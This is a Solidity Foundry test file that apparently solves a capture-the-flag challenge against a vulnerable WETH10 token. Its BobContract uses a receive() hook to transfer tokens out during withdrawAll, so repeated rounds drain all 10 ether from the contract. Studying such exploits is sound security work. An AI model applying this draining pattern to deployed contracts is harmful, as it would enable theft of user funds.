// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "src/WETH10.sol";

contract Weth10Test is Test {
    WETH10 public weth;
    address owner;
    address bob;

    function setUp() public {
        weth = new WETH10();
        bob = makeAddr("bob");

        vm.deal(address(weth), 10 ether);
        vm.deal(address(bob), 1 ether);
    }

    function testHack() public {
        assertEq(address(weth).balance, 10 ether, "weth contract should have 10 ether");

        vm.startPrank(bob);

        // hack time!
		BobContract bc = new BobContract(weth);

		// give contract 1 ether
		bc.deposit{value: 1 ether}();

		// run 10 round, each round increases WETH10.balaceOf(bob) by 1 ether.
		for(uint i=0; i<10; i++) {
			bc.oneRound();
		}

		// so far, bob should have 10 ether of WETH10, withdraw to ether
		weth.withdrawAll();

		// bob get back 1 ether from the contract
		bc.withdraw();

        vm.stopPrank();
        assertEq(address(weth).balance, 0, "empty weth contract");
        assertEq(bob.balance, 11 ether, "player should end with 11 ether");
    }
}

contract BobContract {
	address bob;
    WETH10 weth;

	constructor(WETH10 _weth) {
		bob = msg.sender;
		weth = _weth;
	}

	// bob deposit 1 ether for further operations
	function deposit() external payable {}
	// bob withdraw 1 ether after all done
	function withdraw() external { 
		Address.sendValue(payable(bob), 1 ether);
	}

	// each round costs nothing but gains 1 ether of WETH10 token
	function oneRound() external payable {
		weth.deposit{value: 1 ether}();
		weth.withdrawAll();
	}

	receive() external payable {
		// transfer away the WETH10 token to prevent being burned.
		weth.transfer(address(bob), 1 ether);
	}
}
